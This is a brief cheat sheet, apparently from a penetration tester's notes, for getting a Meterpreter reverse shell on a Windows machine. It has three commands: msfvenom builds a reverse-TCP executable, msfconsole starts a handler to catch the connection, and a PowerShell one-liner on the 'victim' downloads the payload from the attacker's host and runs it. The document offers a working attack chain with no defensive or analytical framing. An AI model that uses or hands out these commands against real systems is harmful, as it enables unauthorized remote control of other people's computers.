# On attacker

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe > <FILENAME>`

`msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; exploit'`


# On victim

`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/<FILENAME>', 'C:\Windows\Temp\<FILENAME>'); Start-Process 'C:\Windows\Temp\<FILENAME>'"`
